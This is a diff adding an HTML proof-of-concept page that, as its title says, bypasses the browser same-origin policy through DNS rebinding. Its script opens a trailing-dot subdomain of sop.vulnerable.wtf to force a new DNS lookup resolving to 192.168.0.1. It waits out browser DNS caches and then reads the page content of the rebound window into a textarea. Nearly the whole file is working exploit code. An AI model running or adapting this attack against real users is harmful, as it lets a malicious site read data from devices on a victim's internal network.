@@ -1,0 +1,35 @@
+<html>
+    <head>
+        <title>SOP bypass PoC</title>
+        <script>
+            var subdomain=window.location.hostname.split(".")[0];
+            function prepare() {
+                if (window.location == "http://" + subdomain + ".sop.vulnerable.wtf./") { // we're called with trailing dot
+                    var w = window.open("", "sopwtf"); // find the prev opened window
+                    document.getElementById("result").value=w.document.body.innerHTML; // show the dataz
+                }
+            }
+            function boom() {
+                var timeout=5000; // 5sec seems fine in most cases
+
+                if (navigator.userAgent.indexOf('Safari') != -1 && navigator.userAgent.indexOf('Chrome') != -1) {
+                    timeout=65000; // wait for chrome and operas internal dns cache to clear
+                }
+                var w = window.open("http://" + subdomain + ".sop.vulnerable.wtf.", "sopwtf"); // open new tab with trailing dot to force a new dns query -> site opens 192.168.0.1
+                document.getElementById("foo").innerHTML="<h2>please wait " + timeout/1000 + " seconds! :)<h2>";
+                setTimeout(
+                    function () {
+                        document.getElementById("foo").innerHTML="<img src=\"http://" + subdomain + ".sop.vulnerable.wtf./\" />"; // force another dns refresh after cache expired (chrome/opera) or just after a few sec (other browsers)
+                        window.location = "http://" + subdomain + ".sop.vulnerable.wtf."; // redirect ourself to trailing dot domain
+                    }, timeout
+                );
+            }
+            </script>
+    </head>
+    <body onload="prepare();">
+        <button type="button" onclick="boom();">Kaboom!</button>
+        <div id="foo"></div>
+        <textarea id="result" rows="20" cols="50"></textarea>
+    </body>
+</html>
+
